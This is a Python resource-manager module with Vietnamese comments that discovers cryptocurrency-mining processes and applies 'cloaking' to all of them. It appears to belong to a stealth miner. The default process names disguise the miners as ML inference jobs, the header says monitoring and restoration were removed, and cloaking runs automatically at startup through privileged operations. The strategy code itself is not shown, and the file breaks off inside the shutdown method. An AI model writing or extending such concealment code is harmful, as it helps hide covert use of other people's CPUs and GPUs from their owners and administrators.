"""
Module resource_manager.py - Quản lý tài nguyên (CPU, GPU, Network...) theo mô hình đồng bộ (threading).
Sau khi refactor, module này:
- BỎ toàn bộ cơ chế giám sát (nhiệt độ, công suất) & watchers.
- BỎ cơ chế restore hoàn toàn.
- Khi start, tự động khám phá tiến trình và CLOAK luôn.
- Chỉ hỗ trợ cloaking, không có restoration.
"""

import logging
import psutil
import pynvml
import traceback
import threading
import queue
import time
from threading import RLock
from typing import List, Any, Dict, Optional
from itertools import count

# Các import liên quan đến dự án
from .utils import MiningProcess
from .resource_control import ResourceControlFactory, CPUResourceManager, CloakStrategyFactory
from .auxiliary_modules.interfaces import IResourceManager
from .auxiliary_modules.models import ConfigModel
from .auxiliary_modules.event_bus import EventBus
from .privileged_operations import get_privileged_manager

class SharedResourceManager:
    """
    Lớp quản lý tài nguyên chung (VD: GPU, CPU).
    - Khởi tạo/tắt NVML
    - Đọc GPU usage, cache usage
    - Áp dụng CloakStrategy cho tiến trình
    """

    def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
        self.logger = logger
        self.config = config
        self.resource_managers = resource_managers
        self.strategy_cache = {}
        
        # Khởi tạo PrivilegedOperationManager (singleton)
        self.privileged_manager = get_privileged_manager(logger)
        
        # Kiểm tra security context
        security_context = self.privileged_manager.validate_security_context()
        self.logger.info(f"Security context: User={security_context['user']}, Root={security_context['is_root']}")

        self._nvml_init = False
        try:
            self.initialize_nvml()
            self.logger.info("SharedResourceManager khởi tạo OK.")
        except Exception as e:
            self.logger.error(f"Lỗi init SharedResourceManager: {e}\n{traceback.format_exc()}")
            raise

    def is_nvml_initialized(self) -> bool:
        return self._nvml_init

    def initialize_nvml(self):
        if not self._nvml_init:
            try:
                # Ultra-fast NVML initialization với timeout protection
                self.logger.debug("Fast NVML initialization...")
                
                # Timeout wrapper cho NVML init
                def nvml_init_with_timeout():
                    pynvml.nvmlInit()
                    return True
                
                # Try với timeout để tránh blocking
                import signal
                def timeout_handler(signum, frame):
                    raise TimeoutError("NVML init timeout")
                
                signal.signal(signal.SIGALRM, timeout_handler)
                signal.alarm(3)  # 3 giây timeout
                
                try:
                    nvml_init_with_timeout()
                    self._nvml_init = True
                    self.logger.info("NVML đã được khởi tạo thành công.")
                finally:
                    signal.alarm(0)  # Clear timeout
                    
            except (TimeoutError, Exception) as e:
                self.logger.warning(f"NVML initialization failed/timeout: {e} - continuing without GPU support")
                self._nvml_init = False

    def shutdown_nvml(self):
        if self._nvml_init:
            try:
                pynvml.nvmlShutdown()
                self._nvml_init = False
                self.logger.debug("Đã shutdown NVML thành công.")
            except pynvml.NVMLError as e:
                self.logger.error(f"Lỗi khi shutdown NVML: {e}")

    def get_process_cache_usage(self, pid: int) -> float:
        """
        Đọc /proc/[pid]/status => VmCache => tính % so với total RAM.
        """
        try:
            status_file = f"/proc/{pid}/status"
            with open(status_file, 'r') as f:
                for line in f:
                    if line.startswith("VmCache:"):
                        cache_kb = int(line.split()[1])
                        total_mem_kb = psutil.virtual_memory().total / 1024
                        cache_percent = (cache_kb / total_mem_kb) * 100
                        self.logger.debug(f"PID={pid} sử dụng cache: {cache_percent:.2f}%")
                        return cache_percent
            self.logger.warning(f"Không tìm thấy VmCache cho PID={pid}.")
            return 0.0
        except FileNotFoundError:
            self.logger.error(f"Không tìm thấy tiến trình với PID={pid} khi lấy cache.")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi get_process_cache_usage(PID={pid}): {e}\n{traceback.format_exc()}")
            return 0.0

    def get_gpu_usage_percent(self, pid: int) -> float:
        try:
            return self._sync_get_gpu_usage_percent(pid)
        except Exception as e:
            self.logger.error(f"Lỗi bất ngờ trong get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def _sync_get_gpu_usage_percent(self, pid: int) -> float:
        try:
            if not self.is_nvml_initialized():
                self.logger.debug("_sync_get_gpu_usage_percent: NVML chưa init => init.")
                self.initialize_nvml()

            if not self._nvml_init:
                return 0.0

            device_count = pynvml.nvmlDeviceGetCount()
            total_gpu_usage = 0.0
            gpu_present = False

            for i in range(device_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                procs = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
                for proc in procs:
                    if proc.pid == pid:
                        gpu_present = True
                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                        total_gpu_usage += utilization.gpu

            return total_gpu_usage if gpu_present else 0.0
        except pynvml.NVMLError as e:
            self.logger.error(f"Lỗi khi thu thập GPU usage: {e}")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi không xác định trong _sync_get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        """
        Áp dụng chiến lược cloak cho một tiến trình cụ thể.
        """
        try:
            pid = process.pid
            name = process.name
            self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name,
                self.config,
                self.logger,
                self.resource_managers
            )
            if not strategy or not callable(getattr(strategy, 'apply', None)):
                self.logger.error(f"Chiến lược '{strategy_name}' không khả dụng.")
                return

            # Inject privileged_manager nếu strategy cần
            if hasattr(strategy, 'set_privileged_manager'):
                strategy.set_privileged_manager(self.privileged_manager)

            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
            strategy.apply(process)
            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")

            # ---------------- Sprint-2: Đăng ký PID CPU cho plug-in engine ----------------
            try:
                is_gpu = hasattr(process, "is_gpu_process") and callable(getattr(process, "is_gpu_process")) and process.is_gpu_process()
                if not is_gpu:
                    cpu_mgr = CPUResourceManager({}, self.logger)  # singleton; config rỗng vì đã init
                    cpu_mgr.register_pid(pid)
            except Exception as exc:  # noqa: BLE001
                self.logger.debug(f"Không thể register_pid cho CPU plug-ins (PID={pid}): {exc}")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )
            raise

class ResourceManager(IResourceManager):
    """
    Lớp ResourceManager chỉ còn chức năng:
    - Khởi tạo SharedResourceManager
    - Khám phá tiến trình (duy nhất 1 lần) và Cloak tất cả
    - Không giám sát, không restore
    """

    _instance = None
    _instance_lock = threading.Lock()

    def __new__(cls, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(ResourceManager, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
        if getattr(self, '_initialized', False):
            return

        self._initialized = True
        self.logger = logger
        self.config = config
        self.event_bus = event_bus

        # Cờ dừng
        self._stop_flag = False

        # Danh sách process + lock
        self.mining_processes_lock = threading.RLock()
        self.mining_processes: List[MiningProcess] = []

        # Hàng đợi cloaking riêng biệt cho CPU và GPU (theo blueprint)
        self._cpu_cloaking_queue = queue.PriorityQueue()
        self._gpu_cloaking_queue = queue.PriorityQueue()

        # **EventBus subscribe** (đăng ký EventBus) - **PID Propagation Flow Step 2**
        self._setup_eventbus_subscriptions()
        
        # Hàng đợi cloaking chung (legacy compatibility)
        self.resource_adjustment_queue = queue.PriorityQueue()

        # Thread workers
        self.workers: List[threading.Thread] = []

        self.shared_resource_manager: Optional[SharedResourceManager] = None

        self._counter = count()
        self.process_states: Dict[int, str] = {}  # "normal", "cloaking", "cloaked"

        self.logger.info("ResourceManager.__init__ (redesigned với CPU/GPU cloaking queues)")

        # Đăng ký event 'resource_adjustment' (nếu cần)
        self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)
        
        # ✅ PHASE 3 REFACTORING: Thêm missing subscriber cho new_process_detected
        self.event_bus.subscribe('new_process_detected', self.handle_new_process_detected)
        # New standardized format
        self.event_bus.subscribe('process:detected', self.handle_new_process_detected)

    def is_gpu_initialized(self) -> bool:
        """
        Kiểm tra xem GPU (NVML) đã được khởi tạo hay chưa.
        """
        return self.shared_resource_manager and self.shared_resource_manager.is_nvml_initialized()

    def handle_resource_adjustment(self, event_data: Dict[str, Any]):
        """
        Handler cho event 'resource_adjustment'.
        """
        self.logger.debug(f"Nhận event resource_adjustment: {event_data}")
        
        # ✅ PHASE 3 REFACTORING: Hoàn thiện Event Consistency
        # Thêm missing publisher cho resource_adjustment event
        try:
            # Process the resource adjustment
            pid = event_data.get('pid')
            adjustment_type = event_data.get('type', 'unknown')
            
            self.logger.info(f"Processing resource adjustment for PID={pid}, type={adjustment_type}")
            
            # Publish completion event với new standardized naming
            completion_payload = {
                'pid': pid,
                'adjustment_type': adjustment_type,
                'status': 'completed',
                'timestamp': time.time(),
                'processed_by': 'ResourceManager'
            }
            
            # New standardized format
            self.event_bus.publish('resource:adjustment_completed', completion_payload)
            # Legacy format for backward compatibility
            self.event_bus.publish('resource_adjustment_completed', completion_payload)
            
            self.logger.info(f"✅ Published resource adjustment completion event for PID={pid}")
            
        except Exception as e:
            self.logger.error(f"❌ Error in resource adjustment processing: {e}")
            # Publish error event
            error_payload = {
                'pid': event_data.get('pid'),
                'status': 'error',
                'error': str(e),
                'timestamp': time.time()
            }
            self.event_bus.publish('resource:adjustment_error', error_payload)

    def handle_new_process_detected(self, event_data: Dict[str, Any]):
        """
        Handler cho event 'new_process_detected'.
        ✅ PHASE 3 REFACTORING: Thêm missing subscriber để hoàn thiện Event Consistency
        """
        try:
            pid = event_data.get('pid')
            process_name = event_data.get('name', 'unknown')
            is_gpu = event_data.get('is_gpu', False)
            
            self.logger.info(f"🔍 [NEW-PROCESS] Detected new process: {process_name} (PID={pid}, GPU={is_gpu})")
            
            # Validate process still exists
            if not psutil.pid_exists(pid):
                self.logger.warning(f"⚠️ [NEW-PROCESS] Process PID={pid} no longer exists, skipping")
                return
            
            # Log process details for monitoring
            try:
                proc = psutil.Process(pid)
                cpu_percent = proc.cpu_percent()
                memory_mb = proc.memory_info().rss / (1024 * 1024)
                
                self.logger.info(f"📊 [NEW-PROCESS] Process stats: CPU={cpu_percent:.1f}%, Memory={memory_mb:.1f}MB")
                
                # Trigger additional monitoring if needed
                if is_gpu and self.is_gpu_initialized():
                    gpu_usage = self.shared_resource_manager.get_gpu_usage_percent(pid)
                    self.logger.info(f"🎮 [NEW-PROCESS] GPU usage: {gpu_usage:.1f}%")
                
            except psutil.NoSuchProcess:
                self.logger.warning(f"⚠️ [NEW-PROCESS] Process PID={pid} disappeared during monitoring")
            except Exception as e:
                self.logger.error(f"❌ [NEW-PROCESS] Error monitoring process PID={pid}: {e}")
            
            # Acknowledge the detection
            ack_payload = {
                'original_pid': pid,
                'acknowledged_by': 'ResourceManager',
                'timestamp': time.time(),
                'action_taken': 'monitoring_enabled'
            }
            
            # Publish acknowledgment với standardized naming
            self.event_bus.publish('process:detection_acknowledged', ack_payload)
            self.logger.info(f"✅ [NEW-PROCESS] Acknowledged detection of PID={pid}")
            
        except Exception as e:
            self.logger.error(f"❌ Error handling new_process_detected event: {e}")

    def _setup_eventbus_subscriptions(self):
        """**Enhanced EventBus setup** (thiết lập EventBus nâng cao) với **RabbitMQ fallback mechanism** (cơ chế dự phòng RabbitMQ)"""
        try:
            # **Primary attempt** (thử nghiệm chính): Sử dụng **configured backend** (backend đã cấu hình)
            self.logger.info("🔌 Setting up EventBus subscriptions with configured backend...")
            
            # ✅ PHASE 2 REFACTORING: Migrate to new Event Naming Conventions
            # Subscribe to new standardized mining events (domain:action pattern)
            self.event_bus.subscribe('mining:cpu_started', self._on_cpu_mining_event)
            self.event_bus.subscribe('mining:gpu_started', self._on_gpu_mining_event)
            
            # Backward compatibility: Keep legacy subscriptions during transition period
            self.event_bus.subscribe('channel:cpu', self._on_cpu_mining_event)
            self.event_bus.subscribe('channel:gpu', self._on_gpu_mining_event)
            
            # **Test EventBus functionality** (kiểm tra chức năng EventBus) với **timeout protection** (bảo vệ timeout)
            self.event_bus.start_listening()
            
            self.logger.info("✅ EventBus subscriptions established successfully (primary backend)")
            
        except Exception as e:
            self.logger.error(f"❌ Primary EventBus backend failed: {e}")
            
            # **FALLBACK MECHANISM** (cơ chế dự phòng): Switch to **memory backend** (chuyển sang backend bộ nhớ)
            try:
                self.logger.warning("🔄 Activating fallback: switching to memory EventBus backend...")
                
                # **Create new memory EventBus** (tạo EventBus bộ nhớ mới)
                from .auxiliary_modules.event_bus import EventBus
                self.event_bus = EventBus(backend_type="memory", logger=self.logger)
                
                # **Re-setup subscriptions** (thiết lập lại subscriptions) với **memory backend** (backend bộ nhớ)
                self.event_bus.subscribe('mining:cpu_started', self._on_cpu_mining_event)
                self.event_bus.subscribe('mining:gpu_started', self._on_gpu_mining_event)
                self.event_bus.subscribe('channel:cpu', self._on_cpu_mining_event)
                self.event_bus.subscribe('channel:gpu', self._on_gpu_mining_event)
                
                # Start memory EventBus (luôn thành công cho memory backend)
                self.event_bus.start_listening()
                
                self.logger.info("✅ Fallback successful: Memory EventBus is operational")
                
            except Exception as fallback_e:
                self.logger.error(f"❌ Memory EventBus fallback failed: {fallback_e}")
                # **Final fallback** (dự phòng cuối cùng): Continue without EventBus
                self.logger.warning("⚠️ Running without EventBus - system will use process discovery fallback")
                self.event_bus = None

    def _on_cpu_mining_event(self, payload: Dict[str, Any]) -> None:
        """Handle CPU mining events - PID Propagation Flow Step 2"""
        try:
            event_type = payload.get('event_type')
            pid = payload.get('pid')
            
            if event_type == 'mining_started' and pid:
                self.logger.info(f"🔨 ResourceManager received CPU mining_started: PID={pid}")
                
                # Create MiningProcess object
                process_name = payload.get('data', {}).get('process_name', 'ml-inference')
                mining_process = MiningProcess(pid, process_name, False)  # False = CPU
                
                # Add to tracking list
                with self.mining_processes_lock:
                    self.mining_processes.append(mining_process)
                
                # **register_pid** (đăng ký PID) với CPU plugins
                self._register_cpu_pid(pid)
                
                # **enqueue_cloaking** (xếp hàng cloaking)
                self.enqueue_cloaking(mining_process)
                
                self.logger.info(f"✅ CPU PID {pid} processed: registered + enqueued for cloaking")
                
        except Exception as e:
            self.logger.error(f"❌ Error handling CPU mining event: {e}")

    def _on_gpu_mining_event(self, payload: Dict[str, Any]) -> None:
        """Handle GPU mining events - PID Propagation Flow Step 2"""
        try:
            event_type = payload.get('event_type')
            pid = payload.get('pid')
            
            if event_type == 'mining_started' and pid:
                self.logger.info(f"🎮 ResourceManager received GPU mining_started: PID={pid}")
                
                # Create MiningProcess object
                process_name = payload.get('data', {}).get('process_name', 'inference-cuda')
                mining_process = MiningProcess(pid, process_name, True)  # True = GPU
                
                # Add to tracking list
                with self.mining_processes_lock:
                    self.mining_processes.append(mining_process)
                
                # **enqueue_cloaking** (xếp hàng cloaking)
                self.enqueue_cloaking(mining_process)
                
                self.logger.info(f"✅ GPU PID {pid} processed: enqueued for cloaking")
                
        except Exception as e:
            self.logger.error(f"❌ Error handling GPU mining event: {e}")

    def _register_cpu_pid(self, pid: int) -> None:
        """Register PID với CPU plugins - extracted from existing code"""
        try:
            from .resource_control import CPUResourceManager
            
            cpu_mgr = CPUResourceManager({}, self.logger)  # singleton; config rỗng vì đã init
            cpu_mgr.register_pid(pid)
            self.logger.debug(f"✅ CPU PID {pid} registered with CPU plugins")
            
        except Exception as exc:
            self.logger.debug(f"❌ Không thể register_pid cho CPU plug-ins (PID={pid}): {exc}")

    def enqueue_cloaking(self, process: MiningProcess) -> None:
        """
        Đưa tiến trình vào hàng đợi cloaking phù hợp.
        Redesigned theo blueprint: CPU/GPU queues riêng biệt.
        """
        pid = process.pid
        name = process.name
        
        try:
            if self.process_states.get(pid) == "cloaked":
                self.logger.debug(f"PID={pid} đã được cloaked, bỏ qua.")
                return

            priority = process.priority
            count_val = next(self._counter)
            
            # Phân loại tiến trình theo blueprint
            is_gpu = hasattr(process, "is_gpu_process") and callable(getattr(process, "is_gpu_process")) and process.is_gpu_process()
            
            task = {
                'type': 'cloaking',
                'process': process,
                'strategies': ['gpu_cloaking'] if is_gpu else ['cpu_cloaking']
            }
            
            # Thêm vào hàng đợi thích hợp theo blueprint
            if is_gpu:
                self.logger.info(f"Đưa {name} (PID={pid}) vào GPU cloaking queue")
                self._gpu_cloaking_queue.put((priority, count_val, task))
            else:
                self.logger.info(f"Đưa {name} (PID={pid}) vào CPU cloaking queue")
                self._cpu_cloaking_queue.put((priority, count_val, task))
                
            # Thêm vào queue chung cho legacy compatibility
            self.resource_adjustment_queue.put((priority, count_val, task))
            self.process_states[pid] = "cloaking"
            
            # Gửi event thông báo có process mới (theo blueprint)
            # ✅ PHASE 3 REFACTORING: Chuẩn hóa event naming cho new_process_detected
            process_payload = {
                'pid': pid,
                'name': name,
                'is_gpu': is_gpu,
                'timestamp': time.time()
            }
            
            # New standardized format
            self.event_bus.publish('process:detected', process_payload)
            # Legacy format for backward compatibility
            self.event_bus.publish('new_process_detected', process_payload)
            
            self.logger.info(f"✅ Đã enqueue cloaking cho {name} (PID={pid}) - {'GPU' if is_gpu else 'CPU'} queue")
            
        except Exception as e:
            self.logger.error(f"Lỗi khi enqueue process {name} (PID={pid}): {e}\n{traceback.format_exc()}")

    # -----------------------------------------------------------------------------------------
    # METRICS (SYNC)
    # -----------------------------------------------------------------------------------------

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        try:
            if not psutil.pid_exists(process.pid):
                self.logger.warning(f"PID={process.pid} không tồn tại.")
                return {}

            proc_obj = psutil.Process(process.pid)
            cpu_pct = proc_obj.cpu_percent(interval=1)
            mem_mb = proc_obj.memory_info().rss / (1024**2)

            gpu_pct = 0.0
            if self.is_gpu_initialized():
                gpu_pct = self.shared_resource_manager.get_gpu_usage_percent(process.pid)

            # Tùy logic dự án, ở đây ví dụ:
            disk_mbps = 0.0 # Tính sau
            cache_l = self.shared_resource_manager.get_process_cache_usage(process.pid) if self.shared_resource_manager else 0.0

            metrics = {
                'cpu_usage': float(cpu_pct),
                'memory_usage': float(mem_mb),
                'gpu_usage': float(gpu_pct),
                'network_usage': float(disk_mbps),
                'cache_usage': float(cache_l),
            }
            self.logger.debug(f"Metrics PID={process.pid}: {metrics}")
            return metrics
        except Exception as e:
            self.logger.error(f"Lỗi collect_metrics PID={process.pid}: {e}\n{traceback.format_exc()}")
            return {}

    def collect_all_metrics(self) -> Dict[str, Dict[str, Any]]:
        metrics_data: Dict[str, Dict[str, Any]] = {}
        if not self.mining_processes_lock.acquire(timeout=5):
            self.logger.error("Timeout lock collect_all_metrics.")
            return metrics_data
        try:
            for p in self.mining_processes:
                res = self.collect_metrics(p)
                if res:
                    metrics_data[str(p.pid)] = res
                else:
                    self.logger.warning(f"Không có metrics hợp lệ cho PID={p.pid}")
            self.logger.debug(f"Dữ liệu metrics (all): {metrics_data}")
        except Exception as e:
            self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
        finally:
            self.mining_processes_lock.release()

        return metrics_data

    def start(self):
        self.logger.info("🚀 Starting ResourceManager (Ultra-Fast Non-Blocking Initialization)...")
        start_time = time.time()
        try:
            # Step 1: Minimal essential initialization only
            step_start = time.time()
            self.logger.info("⚡ Step 1/3: Essential components creation...")
            
            # Quick resource managers creation với timeout protection
            try:
                resource_managers = ResourceControlFactory.create_resource_managers(
                    config=self.config,
                    logger=self.logger
                )
                if not resource_managers:
                    self.logger.warning("ResourceControlFactory trả về rỗng - using fallback mode")
                    resource_managers = {}  # Fallback mode
                self.logger.info(f"✅ Step 1 completed in {time.time() - step_start:.2f}s")
            except Exception as e:
                self.logger.warning(f"Resource managers creation failed: {e} - using fallback mode")
                resource_managers = {}

            # Step 2: Fast SharedResourceManager với lazy NVML init
            step_start = time.time()
            self.logger.info("⚡ Step 2/3: Fast SharedResourceManager (lazy init)...")
            try:
                self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)
                self.logger.info(f"✅ Step 2 completed in {time.time() - step_start:.2f}s")
            except Exception as e:
                self.logger.warning(f"SharedResourceManager init failed: {e} - continuing without shared resources")
                self.shared_resource_manager = None

            # Step 3: Background worker setup (non-blocking)
            step_start = time.time()
            self.logger.info("⚡ Step 3/3: Background workers setup...")
            
            # Start worker thread ngay lập tức
            adjust_thread = threading.Thread(
                target=self.process_resource_adjustments,
                daemon=True,
                name="CloakingWorker"
            )
            adjust_thread.start()
            self.workers.append(adjust_thread)
            
            # Background process discovery (non-blocking)
            discovery_thread = threading.Thread(
                target=self._background_discovery_and_cloak,
                daemon=True,
                name="BackgroundDiscovery"
            )
            discovery_thread.start()
            self.workers.append(discovery_thread)
            
            self.logger.info(f"✅ Step 3 completed in {time.time() - step_start:.2f}s")

            total_time = time.time() - start_time
            self.logger.info(f"🎯 ResourceManager startup completed in {total_time:.2f}s (Target: <5s)")
            
            # Ultra-fast main loop với minimal monitoring
            self.logger.info("🔄 Entering minimal main monitoring loop...")
            while not self._stop_flag:
                time.sleep(1.0)  # Basic monitoring interval

            self.logger.info("ResourceManager main loop completed.")
        except Exception as e:
            self.logger.error(f"❌ ResourceManager startup failed: {e}\n{traceback.format_exc()}")
            self.shutdown()

    def _background_discovery_and_cloak(self):
        """Background process discovery và cloaking (non-blocking)"""
        try:
            self.logger.info("🔍 Starting background process discovery...")
            time.sleep(2)  # Delay để system startup xong
            
            discovery_results = self.discover_mining_processes()
            self.logger.info(f"🔍 Background discovery found {len(discovery_results)} processes")
            
            # Trigger cloaking trong background
            if discovery_results:
                self._trigger_initial_cloak_signal()
                self.logger.info("✅ Background cloaking triggered")
            
        except Exception as e:
            self.logger.error(f"Background discovery error: {e}")
            # Continue without failing - system vẫn hoạt động được

    def _trigger_initial_cloak_signal(self):
        """
        Cloak tất cả các tiến trình "đào" ngay khi phát hiện (chỉ gọi 1 lần, không lặp).
        """
        try:
            self.logger.info("Bắt đầu enqueue cloaking cho tất cả tiến trình khai thác...")
            if not self.mining_processes_lock.acquire(timeout=5):
                self.logger.warning("Không lock được mining_processes, bỏ qua cloak.")
                return

            for process in self.mining_processes:
                try:
                    self.enqueue_cloaking(process)
                except Exception as e:
                    self.logger.error(f"Không thể enqueue cloaking PID={process.pid}: {e}\n{traceback.format_exc()}")

            self.logger.info("Hoàn thành enqueue cloaking ban đầu.")
        except Exception as e:
            self.logger.error(f"Lỗi khi enqueue cloaking ban đầu: {e}\n{traceback.format_exc()}")
        finally:
            try:
                self.mining_processes_lock.release()
            except RuntimeError:
                pass

    def process_resource_adjustments(self):
        """
        Worker loop chạy trong một thread riêng để xử lý queue resource_adjustment.
        Chỉ có tác vụ 'cloaking' -> chuyển trạng thái process thành 'cloaked'.
        """
        self.logger.info("=== Bắt đầu vòng lặp process_resource_adjustments (CloakingWorker)...")
        pid = None

        while not self._stop_flag:
            try:
                item = self.resource_adjustment_queue.get(timeout=1)
                priority, count_val, task = item

                p = task.get('process')
                if not p:
                    raise ValueError("Task không có 'process'.")

                pid = p.pid
                self.logger.info(
                    f"[CloakingWorker] Lấy task type={task['type']} cho PID={pid} (priority={priority})."
                )

                if task['type'] == 'cloaking':
                    # Cloaking
                    if not self.shared_resource_manager:
                        self.logger.warning("Chưa có shared_resource_manager, bỏ qua cloaking.")
                        self.resource_adjustment_queue.task_done()
                        continue

                    sr = self.shared_resource_manager
                    strategies = task.get('strategies', [])
                    self.logger.info(f"[CloakingWorker] Bắt đầu cloaking PID={pid} với {strategies}...")

                    for strat in strategies:
                        if strat not in sr.strategy_cache:
                            s = CloakStrategyFactory.create_strategy(
                                strat, self.config, self.logger, sr.resource_managers
                            )
                            sr.strategy_cache[strat] = s
                        else:
                            s = sr.strategy_cache[strat]

                        if s and hasattr(s, 'apply'):
                            s.apply(p)

                    self.process_states[pid] = "cloaked"
                    self.logger.info(f"Process PID={pid} chuyển trạng thái -> cloaked.")

                    # ---------------- Sprint-2: Đăng ký PID CPU cho plug-in engine ----------------
                    try:
                        is_gpu = hasattr(p, "is_gpu_process") and callable(getattr(p, "is_gpu_process")) and p.is_gpu_process()
                        if not is_gpu:
                            cpu_mgr = CPUResourceManager({}, self.logger)  # singleton; config rỗng vì đã init
                            cpu_mgr.register_pid(pid)
                    except Exception as exc:  # noqa: BLE001
                        self.logger.debug(f"Không thể register_pid cho CPU plug-ins (PID={pid}): {exc}")

                self.resource_adjustment_queue.task_done()
                self.logger.info(
                    f"[CloakingWorker] Đã task_done() cho PID={pid}, type={task['type']}."
                )

            except queue.Empty:
                # Không có task => tiếp tục vòng lặp
                continue
            except Exception as e:
                self.logger.error(f"Lỗi process_resource_adjustments: {e}. (PID={pid})")

        self.logger.info("=== Thoát vòng lặp process_resource_adjustments (stop_flag=True).")

    def discover_mining_processes(self):
        """
        Khám phá các tiến trình mining đang chạy.
        Redesigned theo blueprint: Tập trung hóa trong resource_manager.py
        với retry mechanism và enhanced detection patterns.
        """
        try:
            self.logger.info("Đang khám phá các tiến trình mining...")
            mining_processes = []

            # Lấy các tiến trình từ cấu hình
            cpu_process_name = self.config.processes.get("CPU", "ml-inference")
            gpu_process_name = self.config.processes.get("GPU", "inference-cuda")
            
            # Tìm các tiến trình đang chạy với retry mechanism
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    if not self.mining_processes_lock.acquire(timeout=5):
                        self.logger.error("Timeout khi acquire lock discover_mining_processes.")
                        continue

                    # **ENHANCED FALLBACK MECHANISM** - Chỉ chạy sau 30 giây nếu chưa nhận PID từ EventBus
                    received_pids_from_eventbus = len(self.mining_processes) > 0
                    current_time = time.time()
                    
                    # Kiểm tra xem đã đủ 30 giây chưa để kích hoạt fallback
                    if not hasattr(self, '_fallback_start_time'):
                        self._fallback_start_time = current_time
                    
                    fallback_timeout = 30.0  # 30 seconds
                    time_since_start = current_time - self._fallback_start_time
                    
                    if not received_pids_from_eventbus and time_since_start >= fallback_timeout:
                        self.logger.warning("⚠️ Fallback: No PIDs received from EventBus after 30s, using process discovery")
                        self.mining_processes.clear()
                        
                        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                            try:
                                process_name = proc.info['name']
                                cmdline = proc.info['cmdline']
                                cmdline_str = " ".join(cmdline) if cmdline else ""
                                mining_process = None
                                
                                # Phát hiện CPU mining processes
                                if cpu_process_name in process_name or cpu_process_name in cmdline_str:
                                    self.logger.info(f"Fallback: Đã phát hiện CPU mining process: {process_name} (PID={proc.info['pid']})")
                                    prio = self.get_process_priority(process_name)
                                    net_if = self.config.network_interface
                                    mining_process = MiningProcess(proc.info['pid'], process_name, prio, net_if, self.logger)
                                    mining_processes.append(mining_process)
                                    self.mining_processes.append(mining_process)
                                    self.enqueue_cloaking(mining_process)
                                
                                # Phát hiện GPU mining processes
                                elif gpu_process_name in process_name or gpu_process_name in cmdline_str:
                                    self.logger.info(f"Fallback: Đã phát hiện GPU mining process: {process_name} (PID={proc.info['pid']})")
                                    prio = self.get_process_priority(process_name)
                                    net_if = self.config.network_interface
                                    mining_process = MiningProcess(proc.info['pid'], process_name, prio, net_if, self.logger)
                                    # Đánh dấu đây là GPU process
                                    mining_process._is_gpu = True
                                    mining_processes.append(mining_process)
                                    self.mining_processes.append(mining_process)
                                    self.enqueue_cloaking(mining_process)
                                
                                # Cập nhật process states
                                if mining_process and mining_process.pid not in self.process_states:
                                    self.process_states[mining_process.pid] = "normal"
                                    
                            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                                continue
                    
                    elif received_pids_from_eventbus:
                        self.logger.info("✅ EventBus PID propagation working - skipping process discovery fallback")
                    
                    elif time_since_start < fallback_timeout:
                        self.logger.info(f"⏰ Waiting for EventBus PIDs... ({time_since_start:.1f}s/{fallback_timeout}s)")
                        # Trả về empty list để trigger retry
                        return []
                    
                    self.logger.info(f"Đã phát hiện {len(mining_processes)} tiến trình mining.")
                    self.mining_processes_lock.release()
                    return mining_processes
                    
                except Exception as e:
                    if attempt < max_retries - 1:
                        self.logger.warning(f"Lỗi khi khám phá tiến trình (lần {attempt + 1}): {e}")
                        time.sleep(2)  # Backoff delay
                        continue
                    else:
                        raise
                finally:
                    try:
                        self.mining_processes_lock.release()
                    except RuntimeError:
                        pass
            
            self.logger.error("Hết số lần retry, trả về danh sách rỗng")
            return []
            
        except Exception as e:
            self.logger.error(f"Lỗi khi khám phá tiến trình: {e}\n{traceback.format_exc()}")
            return []

    def get_process_priority(self, process_name: str) -> int:
        priority_map = self.config.process_priority_map
        pri_val = priority_map.get(process_name.lower(), 1)
        if not isinstance(pri_val, int):
            self.logger.warning(f"Priority cho '{process_name}' không phải int => gán=1.")
            return 1
        return pri_val

    def shutdown(self):
        self.logger.info("Dừng ResourceManager... (BẮT ĐẦU)")

        # Bước 0: Chờ hàng đợi cloaking xử lý xong
        self.logger.info("Đợi xử lý xong các tác vụ trong resource_adjustment_queue.")
        self.resource_adjustment_queue.join()
        self.logger.info("Tất cả tác vụ resource_adjustment đã xử lý xong.")

        # Bước 1: Đặt cờ dừng
        self._stop_flag = True

        # Bước 2: Chờ thread "CloakingWorker" dừng
        start_time = time.time()
        timeout = 10
        self.logger.info(f"Chờ tối đa {timeout} giây để dừng CloakingWorker...")

        while time.time() - start_time < timeout:
            if all(not w.is_alive() for w in self.workers):
                self.logger.info("CloakingWorker đã dừng.")
                break
            time.sleep(2)
        else:
            self.logger.warning("CloakingWorker vẫn đang chạy sau thời gian chờ.")

        # Bước 3. Tắt NVML
        try:
            if self.shared_resource_manager:
                self.shared_resource_manager.shutdown_nvml()
                self.logger.info("NVML đã được tắt.")
            else:
